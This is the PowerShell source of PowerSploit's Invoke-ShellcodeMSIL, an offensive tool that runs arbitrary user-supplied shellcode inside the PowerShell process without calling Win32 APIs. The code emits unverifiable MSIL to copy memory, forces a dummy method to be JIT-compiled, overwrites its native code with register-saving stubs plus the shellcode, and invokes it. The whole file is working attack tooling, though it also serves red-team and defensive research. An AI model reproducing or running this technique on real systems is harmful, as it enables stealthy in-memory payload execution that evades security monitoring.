function Invoke-ShellcodeMSIL
{
<#
.SYNOPSIS

    Execute shellcode within the context of the running PowerShell process without making any Win32 function calls.

    PowerSploit Function: Invoke-ShellcodeMSIL
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION

    Invoke-ShellcodeMSIL executes shellcode by using specially crafted MSIL opcodes to overwrite a JITed dummy method. This technique is compelling because unlike Invoke-Shellcode, Invoke-ShellcodeMSIL doesn't call any Win32 functions.

.PARAMETER Shellcode

    Specifies the shellcode to be executed.

.EXAMPLE

    C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)

    Description
    -----------
    Executes the following instructions - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
    Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!

.NOTES

    Your shellcode must end in a ret (0xC3) and maintain proper stack alignment or PowerShell will crash!

    Use the '-Verbose' option to print detailed information.

.LINK

    http://www.exploit-monday.com
#>

    [CmdletBinding()] Param (
        [Parameter( Mandatory = $True )]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $Shellcode
    )

    function Get-MethodAddress
    {
        [CmdletBinding()] Param (
            [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
            [System.Reflection.MethodInfo]
            $MethodInfo
        )

        if ($MethodInfo.MethodImplementationFlags -eq 'InternalCall')
        {
            Write-Warning "$($MethodInfo.Name) is an InternalCall method. These methods always point to the same address."
        }

        try { $Type = [MethodLeaker] } catch [Management.Automation.RuntimeException] # Only build the assembly if it hasn't already been defined
        {
            if ([IntPtr]::Size -eq 4) { $ReturnType = [UInt32] } else { $ReturnType = [UInt64] }

            $Domain = [AppDomain]::CurrentDomain
            $DynAssembly = New-Object System.Reflection.AssemblyName('MethodLeakAssembly')
            # Assemble in memory
            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('MethodLeakModule')
            $TypeBuilder = $ModuleBuilder.DefineType('MethodLeaker', [System.Reflection.TypeAttributes]::Public)
            # Declaration of the LeakMethod method
            $MethodBuilder = $TypeBuilder.DefineMethod('LeakMethod', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, $ReturnType, $null)
            $Generator = $MethodBuilder.GetILGenerator()

            # Push unmanaged pointer to MethodInfo onto the evaluation stack
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldftn, $MethodInfo)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)

            # Assemble everything
            $Type = $TypeBuilder.CreateType()
        }

        $Method = $Type.GetMethod('LeakMethod')

        try
        {
            # Call the method and return its JITed address
            $Address = $Method.Invoke($null, @())

            Write-Output (New-Object IntPtr -ArgumentList $Address)
        }
        catch [System.Management.Automation.MethodInvocationException]
        {
            Write-Error "$($MethodInfo.Name) cannot return an unmanaged address."
        }
    }

#region Define the method that will perform the overwrite
    try { $SmasherType =  [MethodSmasher] } catch [Management.Automation.RuntimeException] # Only build the assembly if it hasn't already been defined
    {
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('MethodSmasher')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $Att = New-Object System.Security.AllowPartiallyTrustedCallersAttribute
        $Constructor = $Att.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $AssemblyBuilder.SetCustomAttribute($AttribBuilder)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('MethodSmasher')
        $ModAtt = New-Object System.Security.UnverifiableCodeAttribute
        $Constructor = $ModAtt.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $ModAttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $ModuleBuilder.SetCustomAttribute($ModAttribBuilder)
        $TypeBuilder = $ModuleBuilder.DefineType('MethodSmasher', [System.Reflection.TypeAttributes]::Public)
        $Params = New-Object System.Type[](3)
        $Params[0] = [IntPtr]
        $Params[1] = [IntPtr]
        $Params[2] = [Int32]
        $MethodBuilder = $TypeBuilder.DefineMethod('OverwriteMethod', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, $null, $Params)
        $Generator = $MethodBuilder.GetILGenerator()
        # The following MSIL opcodes are effectively a memcpy
        # arg0 = destinationAddr, arg1 = sourceAddr, arg2 = length
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Volatile)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Cpblk)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)

        $SmasherType = $TypeBuilder.CreateType()
    }

    $OverwriteMethod = $SmasherType.GetMethod('OverwriteMethod')
#endregion

#region Define the method that we're going to overwrite
    try { $Type = [SmashMe] } catch [Management.Automation.RuntimeException] # Only build the assembly if it hasn't already been defined
    {
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('SmashMe')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $Att = New-Object System.Security.AllowPartiallyTrustedCallersAttribute
        $Constructor = $Att.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $AssemblyBuilder.SetCustomAttribute($AttribBuilder)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SmashMe')
        $ModAtt = New-Object System.Security.UnverifiableCodeAttribute
        $Constructor = $ModAtt.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $ModAttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $ModuleBuilder.SetCustomAttribute($ModAttribBuilder)
        $TypeBuilder = $ModuleBuilder.DefineType('SmashMe', [System.Reflection.TypeAttributes]::Public)
        $Params = New-Object System.Type[](1)
        $Params[0] = [Int]
        $MethodBuilder = $TypeBuilder.DefineMethod('OverwriteMe', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, [Int], $Params)
        $Generator = $MethodBuilder.GetILGenerator()
        $XorValue = 0x41424344
        $Generator.DeclareLocal([Int]) | Out-Null
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
        # The following MSIL opcodes serve two purposes:
        # 1) Serves as a dummy XOR function to take up space in memory when it gets jitted
        # 2) A series of XOR instructions won't be optimized out. This way, I'll be guaranteed to sufficient space for my shellcode.
        foreach ($CodeBlock in 1..100)
        {
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldc_I4, $XorValue)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Xor)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Stloc_0)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldloc_0)
            $XorValue++
        }
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldc_I4, $XorValue)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Xor)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)
        $Type = $TypeBuilder.CreateType()
    }

    $TargetMethod = $Type.GetMethod('OverwriteMe')
#endregion

    # Force the target method to be JITed so that is can be cleanly overwritten
    Write-Verbose 'Forcing target method to be JITed...'

    foreach ($Exec in 1..20)
    {
        $TargetMethod.Invoke($null, @(0x11112222)) | Out-Null
    }

    if ( [IntPtr]::Size -eq 4 )
    {
        # x86 Shellcode stub
        $FinalShellcode = [Byte[]] @(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)
        <#
        00000000  60                pushad
        00000001  E804000000        call dword 0xa
        00000006  61                popad
        00000007  31C0              xor eax,eax
        00000009  C3                ret
        YOUR SHELLCODE WILL BE PLACED HERE...
        #>

        Write-Verbose 'Preparing x86 shellcode...'
    }
    else
    {
        # x86_64 shellcode stub
        $FinalShellcode = [Byte[]] @(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,
                                     0x55,0xE8,0x0D,0x00,0x00,0x00,0x5D,0x41,
                                     0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x48,
                                     0x31,0xC0,0xC3)
        <#
        00000000  4154              push r12
        00000002  4155              push r13
        00000004  4156              push r14
        00000006  4157              push r15
        00000008  55                push rbp
        00000009  E80D000000        call dword 0x1b
        0000000E  5D                pop rbp
        0000000F  415F              pop r15
        00000011  415E              pop r14
        00000013  415D              pop r13
        00000015  415C              pop r12
        00000017  4831C0            xor rax,rax
        0000001A  C3                ret
        YOUR SHELLCODE WILL BE PLACED HERE...
        #>

        Write-Verbose 'Preparing x86_64 shellcode...'
    }

    # Append user-provided shellcode.
    $FinalShellcode += $Shellcode

    # Allocate pinned memory for our shellcode
    $ShellcodeAddress = [Runtime.InteropServices.Marshal]::AllocHGlobal($FinalShellcode.Length)

    Write-Verbose "Allocated shellcode at 0x$($ShellcodeAddress.ToString("X$([IntPtr]::Size*2)"))."

    # Copy the original shellcode bytes into the pinned, unmanaged memory.
    # Note: this region of memory if marked PAGE_READWRITE
    [Runtime.InteropServices.Marshal]::Copy($FinalShellcode, 0, $ShellcodeAddress, $FinalShellcode.Length)

    $TargetMethodAddress = [IntPtr] (Get-MethodAddress $TargetMethod)

    Write-Verbose "Address of the method to be overwritten: 0x$($TargetMethodAddress.ToString("X$([IntPtr]::Size*2)"))"
    Write-Verbose 'Overwriting dummy method with the shellcode...'

    $Arguments = New-Object Object[](3)
    $Arguments[0] = $TargetMethodAddress
    $Arguments[1] = $ShellcodeAddress
    $Arguments[2] = $FinalShellcode.Length

    # Overwrite the dummy method with the shellcode opcodes
    $OverwriteMethod.Invoke($null, $Arguments)

    Write-Verbose 'Executing shellcode...'

    # 'Invoke' our shellcode >D
    $ShellcodeReturnValue = $TargetMethod.Invoke($null, @(0x11112222))

    if ($ShellcodeReturnValue -eq 0)
    {
        Write-Verbose 'Shellcode executed successfully!'
    }
}
